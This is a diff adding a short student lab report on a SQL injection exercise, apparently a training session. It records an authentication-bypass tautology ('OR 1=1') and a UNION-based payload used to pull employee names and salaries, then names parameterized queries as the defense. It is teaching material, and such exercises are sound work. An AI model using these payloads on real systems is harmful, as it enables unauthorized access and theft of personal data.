@@ -1,0 +1,19 @@
+==================================================
+SESSION 25: SQL INJECTION EXFILTRATION REPORT
+Name: Sefat E Monzor 
+==================================================
+
+1. AUTHENTICATION BYPASS
+* Tautology Payload Used: [OR 1=1]
+
+2. DATABASE MAPPING (UNION ATTACK)
+* Number of Columns Discovered: [2]
+* Table Name Discovered: [Employees, Users]
+
+3. DATA EXFILTRATION
+* CEO Salary Extracted: [2500000]
+* Final UNION Payload Used: [' UNION SELECT name, salary FROM employees --]
+
+4. REMEDIATION
+* What is the primary defense against this attack?
+Answer: [The primary defense against this attack is using parameterized queries. This prevents the SQL code to execute user input as commands when malicious code used as input.]
